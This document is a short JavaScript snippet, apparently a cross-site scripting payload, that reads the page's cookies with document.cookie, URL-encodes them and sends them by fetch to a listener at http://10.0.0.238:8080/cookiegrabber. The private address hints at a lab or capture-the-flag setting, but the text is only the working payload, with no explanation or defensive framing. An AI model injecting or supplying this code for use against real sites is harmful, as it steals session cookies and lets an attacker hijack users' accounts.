(function(){
    let cookie = document.cookie
    let encodedCookie = encodeURIComponent(cookie)
    fetch("http://10.0.0.238:8080/cookiegrabber?cookie="+encodedCookie)
})();